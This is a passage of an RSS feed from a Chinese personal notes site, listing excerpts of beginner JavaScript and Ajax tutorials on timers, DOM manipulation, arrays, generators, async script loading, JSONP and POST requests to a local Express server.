document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];  var firstTime = new Date(); var lastTime = new Date(); var key = false; // 元素按下时的时间 document.</description>
    </item>
    
    <item>
      <title>JavaScript 定时器</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/window/%E5%AE%9A%E6%97%B6%E5%99%A8/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/window/%E5%AE%9A%E6%97%B6%E5%99%A8/</guid>
      <description>定时器 定时操作的方法全是 Window 对象的方法，这些方法中的 this 都指向 Window
setIntereval() 每隔多少毫秒再循环执行一次回调函数中的代码。
需要注意，这个间隔时间一旦定义就无法被修改。
非常不准确，可以用时间戳来证明。
返回值是一个 id 数值，这个 id 作为当前定时器的唯一标识符。
// 定时器 var time = 1000; setInterval(function () { 	console.log(&amp;#39;定时器&amp;#39;); }, time); // 修改 time，虽然 time 被修改了，但定时器中的 time 依旧也是 1000 time = 10; console.log(time); clearIntereval() 清除由 setInterval() 设置的定时操作。
参数是一个数值。
var i = 0; var time = setInterval(function () { 	console.log(i++); 	if (i &amp;gt; 10) { 	clearInterval(time); 	console.log(&amp;#39;定时器已暂停&amp;#39;); 	} }, 100); setTimeout() 在指定毫秒数之后执行回调函数中的代码。回调函数中的代码只会执行因此。</description>
    </item>
    
    <item>
      <title>JavaScript 拖拽元素</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E6%8B%96%E6%8B%BD%E5%85%83%E7%B4%A0/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E6%8B%96%E6%8B%BD%E5%85%83%E7%B4%A0/</guid>
      <description>拖拽元素 HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;title&amp;gt;拖拽元素&amp;lt;/title&amp;gt; 	&amp;lt;style&amp;gt; 	div { 	width: 100px; 	height: 100px; 	background-color: rgb(15, 190, 131); 	} 	&amp;lt;/style&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;div style=&amp;#34;position:absolute;left:0;top:0;&amp;#34;&amp;gt;该拖曳只对内联样式有效&amp;lt;/div&amp;gt; 	&amp;lt;/body&amp;gt; 	&amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/html&amp;gt; JavaScrip function drag(elem) { 	var disX, disY; 	// 鼠标 	elem.</description>
    </item>
    
    <item>
      <title>JavaScript 脚本化 CSS</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%84%9A%E6%9C%AC%E5%8C%96-css/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%84%9A%E6%9C%AC%E5%8C%96-css/</guid>
      <description>脚本化 CSS 用 JavaScrip 间接操作 CSS，它是通过内联样式表去间接控制 CSS。
间接操作 CSS 时，只有ele.style.attr是读写操作，除此之外的任何操作都是只读操作。</description>
    </item>
    
    <item>
      <title>JavaScript 自动阅读</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%87%AA%E5%8A%A8%E9%98%85%E8%AF%BB/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%87%AA%E5%8A%A8%E9%98%85%E8%AF%BB/</guid>
      <description>自动阅读 JavaScrip var start = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];var stop = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];var time;// 定义一个 key，用来判断自动阅读是否暂停// 如果不加判断，setInterval() 就会被重复执行多个（导致自动阅读的速度增加），而 clearInterval() 则只能暂停第一个 setInterval()（导致自动阅读无法被暂停）var key = &amp;#39;自动阅读已暂停&amp;#39;;start.onclick = function () {// 判断自动阅读的状态if (key == &amp;#39;自动阅读已暂停&amp;#39;) {// 用 setInterval() 反复执行 scrollBy() 实现页面自动向下滚动time = setInterval(function () {window.scrollBy(0, 10);}, 100);// 自动阅读已开始key = &amp;#39;自动阅读已开始&amp;#39;;}};// 自动阅读已暂停stop.onclick = function () {clearInterval(time);key = &amp;#39;自动阅读已暂停&amp;#39;;}; </description>
    </item>
    
    <item>
      <title>JavaScript 返回父元素节点.</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%BF%94%E5%9B%9E%E7%88%B6%E5%85%83%E7%B4%A0%E8%8A%82%E7%82%B9/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%BF%94%E5%9B%9E%E7%88%B6%E5%85%83%E7%B4%A0%E8%8A%82%E7%82%B9/</guid>
      <description>返回父元素节点. JavaScrip function re(e, n) { 	// 如果 e 不为 null 并且 n 不为 0 	while (e &amp;amp;&amp;amp; n) { 	// 获取当前节点的父元素 	e = e.parentElement; 	// 每次循环一次，则想上找一层的父元素，直到 n 为 0 	n--; 	} 	return e; }  var i = document.getElementsByTagName(&amp;#39;i&amp;#39;)[0];  var result = re(i, 3); console.log(result); </description>
    </item>
    
    <item>
      <title>JavaScript 阻止默认事件</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E9%98%BB%E6%AD%A2%E9%BB%98%E8%AE%A4%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E9%98%BB%E6%AD%A2%E9%BB%98%E8%AE%A4%E4%BA%8B%E4%BB%B6/</guid>
      <description>阻止默认事件 默认事件：表单提交、a 元素跳转、右键菜单等。
reture false 阻止某个对象的默认事件，只支持阻止事件句柄 onclick，不支持addEventListener()。
document.oncontextmenu = function () { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	return false; };  document.onclick = function () { 	console.log(&amp;#39;文档被点击&amp;#39;); 	return false; }; preventDefault() 阻止某个对象的默认事件，支持事件句柄，以及addEventListener()。
document.addEventListener( 	&amp;#39;contextmenu&amp;#39;, 	function (event) { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	event.preventDefault(); 	}, 	false ); document.onconte; xtmenu = function (event) { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	event.preventDefault(); }; returnValue() 兼容 IE，与preventDefault()一样，支持阻止事件句柄、以及addEventListener()。
document.oncontextmenu = function (event) { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	event.</description>
    </item>
    
    <item>
      <title>JavaScrip</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/javascrip/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/javascrip/</guid>
      <description>JavaScript JavaScrip 是单线程的语言的原因是因为 JavaScrip 需要对 HTML 页面进行操作，无法一边操作 HTML 文档，一边又加载 HTML 文档。</description>
    </item>
    
    <item>
      <title>JavaScrip 异步加载 JS</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD-js/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD-js/</guid>
      <description>异步加载 JS 有时候，我们需要加载一些工具包，这些工具包与加载 HTML 文档无关，因此，我们就需要异步加载 JavaScrip，即实现 JavaScrip 的多线程。
aysnc=&amp;ldquo;aysnc&amp;rdquo; 异步加载，加载 JavaScrip 文件完就执行，aysnc 只能加载外部 JavaScrip，并不能将 JavaScrip 代码写到 script 元素中。
defer = &amp;ldquo;defer&amp;rdquo; 异步加载，即一边加载 JavaScrip 文件，一边加载 HTML 文档，但是，它需要等 DOM 文档解析完毕后，才会执行其中的 JavaScrip 代码，相当于window.onload，IE 独有。
可以将 JavaScrip 代码写到 script 元素中。
&amp;lt;script src=&amp;#34;vue.js&amp;#34; defer=&amp;#34;defer&amp;#34;&amp;gt; 	console.log(&amp;#39;IE 异步加载&amp;#39;) &amp;lt;/script&amp;gt; 按需异步加载 JS 当我们用创建一个 script 元素，那么需要将它插入到页面中，才会执行这个 JavaScrip 文件。如果不插入的话，仅仅只执行加载这个 JavaScrip 文件，这样，我们就实现了一个异步加载 JavaScrip 的过程。
因为加载 JavaScrip 文件需要一个过程，而程序执行代码的时候，并不会等 main.js 文件下载完毕才继续执行后续代码，因此，这时候如果立即执行 main.js 中的某个方法，会报错。
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>JavaScrip 异步和同步</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%82%E6%AD%A5%E5%92%8C%E5%90%8C%E6%AD%A5/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%82%E6%AD%A5%E5%92%8C%E5%90%8C%E6%AD%A5/</guid>
      <description>异步和同步 同步 异步 异步是目的，多线程是手段。
异步是和同步相对的。同步即阻塞，也即在做 A 的时候做不了 B，AB 可以同时做互不干扰就叫异步。为了实现异步，可以利用多线程。</description>
    </item>
    
    <item>
      <title>JavaScrip 浏览器渲染页面</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2/</guid>
      <description>浏览器渲染页面 构建 DOM 树 解析 DOM 节点，将 HTML 元素以树形结构（二叉树）的方式添加到 DOM 树上，解析的时候只解析节点本身，不解析节点的属性或其包含的文本。
此时还未加载 DOM 树，仅仅只是解析 DOM 节点。
构建 CSS 树 构建 Render 树 DOMTree + CSSTree = RenderTree
RenderTree 构建完成之后，浏览器渲染引擎才正式开始绘制页面
reFlow 该过程需要重新构建整个文档，非常浪费性能。
指的是网络浏览器为了重新渲染部分或全部的文档而重新计算文档中元素的位置和几何结构的过程。例如 dom 节点的删除与添加、dom 节点的宽高发生变化、节点的位置变变化等。
repaint 该过程只重新绘制部分元素。
一个元素的外观的改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制，使元素呈现新的外观。例如改变 vidibility、outline、背景色等属性。
节点布局 页面渲染 </description>
    </item>
    
    <item>
      <title>JavaScrip 生成器</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E7%94%9F%E6%88%90%E5%99%A8/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E7%94%9F%E6%88%90%E5%99%A8/</guid>
      <description>生成器 用function*定义一个生成器函数，该函数通过next()来调用。
生成器函数在执行时能暂停，后面又能从暂停处继续执行。
生成器函数可以被当作一个迭代器来使用。
function* fun() { 	console.log(&amp;#39;我是生成器函数&amp;#39;); }  let iterator = fun(); iterator.next(); yield yield关键字使生成器函数执行暂停，yield关键字后面的表达式的值返回给生成器的调用者。
function* fun() { 	yield console.log(&amp;#39;第一段代码&amp;#39;); 	yield console.log(&amp;#39;第二段代码&amp;#39;); 	yield console.log(&amp;#39;第三段代码&amp;#39;); 	yield console.log(&amp;#39;第四段代码&amp;#39;); }  let iterator = fun(); iterator.next(); iterator.next(); iterator.next(); iterator.next(); iterator.next(); 调用 next()时，如果传入了参数，那么这个参数会传给上一条执行的 yield 左边的变量：
function* fun(val) { 	let result = yield console.log(&amp;#39;第一段代码&amp;#39;); 	console.log(result); 	// 将 str 传给 result 	yield console.log(&amp;#39;第二段代码&amp;#39;); 	yield console.</description>
    </item>
    
    <item>
      <title>JavaScrip 表达式</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>表达式 表达式是一组代码的集合，它会返回一个值。
JavaScript 有以下表达式类型：
 算数：得出一个数字，例如 3.14159. 字符串：得出一个字符串, 例如 &amp;ldquo;Fred&amp;rdquo; 或 &amp;ldquo;234&amp;rdquo;. 逻辑值：得出 true 或者 false。 基本表达式：javascript 中基本的关键字和一般表达式。 左值表达式：分配给左值。  </description>
    </item>
    
    <item>
      <title>JavaScrip 迭代器</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E8%BF%AD%E4%BB%A3%E5%99%A8/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E8%BF%AD%E4%BB%A3%E5%99%A8/</guid>
      <description>迭代器 它是一个对象。
for 用于创建一个循环，由三个表达式和一个用于在循环中执行的代码块组成。
while 当指定表达式为 true，则循环执行代码体，直到表达式为 false 时结束循环。
在一个循环语句中，应当有使表达式为 false 的条件，否则会造成死循环。
do while 不管指定条件是否为 true，其代码块都会被执行一次，直到开始第二次循环时，才开始判断指定条件，直到指定条件为 false 时结束循环。
for in 用于以任意顺序遍历一个对象（除 Symbol 以外）的属性。
因为 for...in 是为遍历对象的属性而构建的，所以并不建议与数组一起使用。
通常与 Object.hasOwnPropert() 一起使用。
var obj = { 	name: &amp;#39;zhu&amp;#39;, 	age: &amp;#39;18&amp;#39;, 	gander: &amp;#39;man&amp;#39;, 	height: 174, 	__proto__: { 	lastName: &amp;#39;不属于 obj 自身的属性&amp;#39;, 	}, }; Object.prototype.zxy = &amp;#39;我是 obj 原型上的属性&amp;#39;; for (var key in obj) { 	// 判断 obj 是否含有自身所没有的属性。 	if (!</description>
    </item>
    
    <item>
      <title>JavaScript Array 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/array/array-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/array/array-%E6%96%B9%E6%B3%95/</guid>
      <description>Array 方法 splice(start,deleteCount,item&amp;hellip;) 从数组的索引 start 开始删除 deleteCount 个元素，并在索引为 start 的地方添加若干个 item 元素，并返回一个新数组。
此方法会改变原数组。
shift() 删除数组的第一个元素，并返回该元素的值。
此方法会改变原数组。
unshift() 将一个或多个元素添加到数组的开头，并返回该数组的新长度，该方法会修改原有数组。
filter() 用于对数组进行过滤，它返回一个过滤后的数组，如果没有任何数组元素通过测试，则返回空数组。
filter()不会对空数组进行检测，不会改变原始数组。
sort() 用原地算法对数组的元素进行排序，并返回数组。
此方法会改变原数组。
它的参数为一个回调函数compareFunction，该回调函数有a、b两个参数，它们分别代表数组中当前进行比较的两个元素：
a 表示在后的那个元素。
b 表示在前的那个元素
数字升序：
var arr = [5, 3, 9, 2, 5, 1, 7]; var result = arr.sort(function (a, b) { 	return a - b; });  console.log(arr); 数字降序：
var arr = [5, 3, 9, 2, 5, 1, 7]; var result = arr.sort(function (a, b) { 	return b - a; });  console.</description>
    </item>
    
    <item>
      <title>JavaScript Element 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element-%E5%B1%9E%E6%80%A7/</guid>
      <description>Element 属性 innerHTML 设置或返回指定元素的内容。返回的内容包含这个元素所包含的子元素以及文本信息。
它会解析 HTML 结构。
设置元素内容的时候，如果元素内容中有子元素，则这些子元素也会被覆盖。
可以在元素内容的后面追加新内容。
var body = document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]; var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0]; // 设置内容 div.innerHTML = &amp;#39;123&amp;#39;; // 追加内容 div.innerHTML += &amp;#39;456&amp;#39;; // 写入 html 元素 div.innerHTML += &amp;#39;&amp;lt;span&amp;gt;写入的元素&amp;lt;/span&amp;gt;&amp;#39;; childElementCount 返回指定元素节点的子元素节点的个数，不包含子元素节点的子元素节点。
firstElementChild 返回指定元素节点的第一个元素节点。
lastElementChild 返回指定元素节点的最后一个元素节点。
children 返回当前元素节点的所有子元素节点，不包含子元素节点的子元素节点。</description>
    </item>
    
    <item>
      <title>JavaScript Element 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element-%E6%96%B9%E6%B3%95/</guid>
      <description>Element 方法 setAttribute() 设置指定元素的属性和属性的值。设置的属性名可以是自定义的属性。
如果这个指定的属性已存在，则仅更改值。
getAttribute() 返回指定属性名的属性值。
getBoundingClientRect() 返回元素的尺寸，以及相对于视口的位置。
如果是标准盒子模型，元素的宽高等于width/height + padding + border-width 的总和。如果box-sizing: border-box，元素的宽高等于 width/height。
返回的结果不是事实的，是静态的。
var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0]; var ele = div.getBoundingClientRect(); </description>
    </item>
    
    <item>
      <title>JavaScript Node 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/node/node-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/node/node-%E5%B1%9E%E6%80%A7/</guid>
      <description>Node 属性 用来遍历节点树。
parentElement 返回当前元素节点的父元素节点。
parentNode 返回指定节点的父节点，一个节点的父节点只有一个。
childNodes 返回指定节点所包含的所有子节点。
firstChild 返回指定节点所包含的最后一个节点
lastChild 返回指定节点所包含的第一个节点
nextSibling 返回在指定节点后面的兄弟节点，如果指定节点为最后一个节点，则返回 null。
previousSibling 返回在指定节点前面的兄弟节点，如果指定节点为第一个节点，则返回 null。</description>
    </item>
    
    <item>
      <title>JavaScript 操作节点</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E6%93%8D%E4%BD%9C%E8%8A%82%E7%82%B9/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E6%93%8D%E4%BD%9C%E8%8A%82%E7%82%B9/</guid>
      <description>操作节点 增加节点 createElement() 创建一个元素节点，但还没有插入到文档中，需要用 appendChild() 将元素插入到文档中。
var div = document.createElement(&amp;#39;div&amp;#39;); createTextNod() 创建一个文本节点，但还没有插入到文档中，需要用 appendChild() 将元素插入到文档中。
var text = document.createTextNode(&amp;#39;我是文本节点&amp;#39;); createComment() 创建一个文本节点，但还没有插入到文档中，需要用 appendChild() 将元素插入到文档中。
var comment = document.createComment(&amp;#39;我是一个注释&amp;#39;); createDocumentFragment(&amp;rsquo;&#39;) 创建了一虚拟的节点对象，也可以说是创建一个文档碎片
var fragment = document.createDocumentFragment(&amp;#39;&amp;#39;); 插入节点 ele.appendChild(subEle) 在 ele 节点的最后一个子节点之后添加 subEle 节点。
如果 subEle 节点已经在文档中存在，那么会将 subEle 节点移动到 ele 节点中。
var body = document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]; var div = document.createElement(&amp;#39;div&amp;#39;); var text = document.createTextNode(&amp;#39;插入的文本&amp;#39;); body.appendChild(div); div.appendChild(text); ele.insertBefore(subEleOne,subEleTwo) 在 ele 节点的子节点 subEleTwo 之前插入一个 subEleOne 节点。
var body = document.</description>
    </item>
    
    <item>
      <title>JavaScript 类数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/array/%E7%B1%BB%E6%95%B0%E7%BB%84/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/array/%E7%B1%BB%E6%95%B0%E7%BB%84/</guid>
      <description>类数组 类数组是可以当作数组来使用的对象
类数组虽然在写法上跟数组一样，但它实际上是 object，且数组能调用的方法它都不能调用的数组。
比如 arguments，函数的第一个参数是 argument[0]，写法上跟数组一样，但是不是数组，它的原型是 Object，它也不能调用数组的一些方法。
特点 具有对象和数组的特性，既可以当作对象来用，也可以当作数组来用（并不是所有的数组方法都能使用，可以自己手动添加）
数据位 存在于数组索引位上的数据。</description>
    </item>
    
    <item>
      <title>Ajax IE 缓存问题</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/ie-%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/ie-%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/</guid>
      <description>Ajax IE 缓存问题 IE 浏览器会会对 Ajax 请求的的结果进行缓存，这会导致下次请求服务器的时候，使用的是本地的缓存，而不是服务器响应的最新数据，这会对一些时效性比较强的一些场景产生影响。
JavaScript 在 open 方法种中的 url 路径中加上一个参数...?t=&#39; + Date.now()即可。该值是获取当前时间戳。
const div = document.getElementById(&amp;#39;result&amp;#39;); const btn = document.getElementById(&amp;#39;btn&amp;#39;); btn.onclick = function () { 	const xhr = new XMLHttpRequest(); 	// 获取时间戳，解决IE 浏览器缓存的问题 	xhr.open(&amp;#39;POST&amp;#39;, &amp;#39;http://localhost:8000/ie?t=&amp;#39; + Date.now()); 	xhr.setRequestHeader(&amp;#39;Content-Type&amp;#39;, &amp;#39;application/x-www-form-urlencoded&amp;#39;); 	xhr.setRequestHeader(&amp;#39;name&amp;#39;, &amp;#39;Rainy&amp;#39;); 	xhr.send(&amp;#39;a=100&amp;amp;b=200&amp;#39;); 	xhr.onreadystatechange = function () { 	if (xhr.readyState == 4) { 	if (xhr.status &amp;gt;= 200 &amp;amp;&amp;amp; xhr.status &amp;lt; 300) { 	div.</description>
    </item>
    
    <item>
      <title>Ajax Jsonp 实现原理</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/jsonp-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/jsonp-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</guid>
      <description>Jsonp 实现原理 script标签本身具有跨域的特性，JSONP 借助这个特定来解决的跨域问题。
服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/jsonp&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 定义数据 	const data = { 	name: &amp;#39;Rainy&amp;#39;, 	}; 	// 将数据转为字符串 	let str = JSON.stringify(data); 	// 响应结果，一个函数调用，函数已经在前端提前声明 	response.end(`handle(${str})`); });  app.listen(port, () =&amp;gt; { 	console.</description>
    </item>
    
    <item>
      <title>Ajax POST 请求</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/post-%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/post-%E8%AF%B7%E6%B1%82/</guid>
      <description>POST 请求 使用 POST 的方式向服务端发送一个请求。
服务端 const express = require(&amp;#39;express&amp;#39;); const app = express(); const port = 8000; // 创建路由规则，允许所有方式的请求 app.all(&amp;#39;/server&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	response.send(&amp;#39;Hello World! POST&amp;#39;); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;./css/main.css&amp;#34; /&amp;gt; 	&amp;lt;title&amp;gt;POST 请求&amp;lt;/title&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;button id=&amp;#34;btn&amp;#34;&amp;gt;点击按钮，发送q&amp;lt;/button&amp;gt; 	&amp;lt;div id=&amp;#34;result&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; 	&amp;lt;/body&amp;gt; 	&amp;lt;script src=&amp;#34;.</description>
    </item>
    
    <item>
      <title>Ajax 手动取消请求</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E6%89%8B%E5%8A%A8%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E6%89%8B%E5%8A%A8%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/</guid>
      <description>手动取消请求 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/delay&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 设置延时响应 	setTimeout(() =&amp;gt; { 	response.send(&amp;#39;Hello IE&amp;#39;); 	}, 1000); }); app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Ajax 请求超时设置</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6%E8%AE%BE%E7%BD%AE/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6%E8%AE%BE%E7%BD%AE/</guid>
